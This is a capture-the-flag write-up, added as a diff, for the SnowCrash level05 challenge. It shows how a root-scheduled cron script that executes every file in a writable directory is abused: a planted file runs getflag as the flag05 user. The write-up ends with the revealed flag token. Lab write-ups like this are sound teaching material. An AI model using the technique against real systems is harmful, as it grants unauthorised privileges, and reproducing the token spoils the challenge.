@@ -1,0 +1,33 @@
+When login to level05, we get a new system mail.
+
+Opening it reveal a crontab scheduled every 2 minutes 
+that runs usr/sbin/openareaserver script with flag05 perm:
+
+cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+
+Opening the /usr/s/bin/openarenaserver script we get :
+
+cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+Looking at /opt/openserver is an empty directory.
+But if we understand that script, it loops every two minute on everyfile of the directory openarenaserver
+Then limit the amount of time execution to 5 seconds, check and execute (bash -x) the file if exists and then
+remove it.
+
+So by just creating a simple file, 
+
+echo "getflag > /tmp/flag" > /opt/openarenaserver/test ; chmod +x /opt/openarenaserver/test
+
+After approximatively 2 minutes the script get executed, our file in /opt/openarenaserver is
+deleted and we have a new file in /tmp/flag containing our flag !
+
+level05@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
